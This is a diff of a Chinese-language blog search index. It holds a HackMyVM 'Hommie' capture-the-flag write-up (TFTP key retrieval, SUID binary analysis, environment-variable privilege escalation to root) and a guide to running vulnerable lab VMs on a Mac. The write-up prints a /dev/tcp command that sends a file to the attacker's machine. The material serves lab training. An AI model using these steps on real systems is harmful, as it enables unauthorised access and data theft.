-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>没有sudo指令  查suid  不一样的就是的第一个<code>/opt/showMetheKey</code><br>执行这个文件之后 发现是一个rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>这个私钥是当前用户的  我们要想办法得到root用户的<br>现在将这个文件下载到本地 <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>用ida分析这个程序<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
-<p>所以修改环境变量 这样子就可以得到root的rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>成功登录到root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>-渗透 -HMV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mac环境靶场搭建</title>
-    <url>/posts/86.html</url>
-    <content><![CDATA[<p>Mac环境下靶场搭建</p>
-<span id="more"></span>
-<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
-<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
-<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
-
-<p>然后下载qemu  mac用户可以用brew下载</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
-<p>然后在靶场解压后的目录中执行</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
-<p>执行后把.vmdk 文件转换成.qcow2文件</p>
-<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
-<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
-<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
-<p>比如我这里这三个ip都不是靶机<br>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
-<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
-<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
-<p>等加载之后重启虚拟机  就发现可以扫到ip啦<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>靶场配置</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-        <tag>工具</tag>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -352,7 +300,64 @@
         <category>hmv</category>
       </categories>
       <tags>
-        <tag>-渗透 -HMV</tag>
+        <tag>渗透</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-Hommie</title>
+    <url>/posts/61994.html</url>
+    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
+<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>发现有三个端口  ftp ssh http<br>先看看ftp能不能匿名登录<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>尝试把反弹shell文件上传  无法得到shell<br>80端口<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>得到两个用户 alexia nobody   并且提示我们要得到alexia的id_rsa<br>目录扫描<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>使用了两个常用的目录字典都没有扫描到 说明大概率就是没有其他目录<br>web如果没有信息就说明信息收集还不过     – 重新用nmap扫描  看看有没有其他服务<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> 有新的发现  还有开放dhcpc tftp 服务<br> 根据前面的提示  get id_rsa  成功得到rsa私钥  登录到ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> 成功拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>没有sudo指令  查suid  不一样的就是的第一个<code>/opt/showMetheKey</code><br>执行这个文件之后 发现是一个rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>这个私钥是当前用户的  我们要想办法得到root用户的<br>现在将这个文件下载到本地 <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>用ida分析这个程序<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
+<p>所以修改环境变量 这样子就可以得到root的rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>成功登录到root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mac环境靶场搭建</title>
+    <url>/posts/86.html</url>
+    <content><![CDATA[<p>Mac环境下靶场搭建</p>
+<span id="more"></span>
+<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
+<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
+<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
+
+<p>然后下载qemu  mac用户可以用brew下载</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
+<p>然后在靶场解压后的目录中执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
+<p>执行后把.vmdk 文件转换成.qcow2文件</p>
+<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
+<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
+<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>比如我这里这三个ip都不是靶机<br>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
+<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
+<p>等加载之后重启虚拟机  就发现可以扫到ip啦<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>靶场配置</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
 </search>
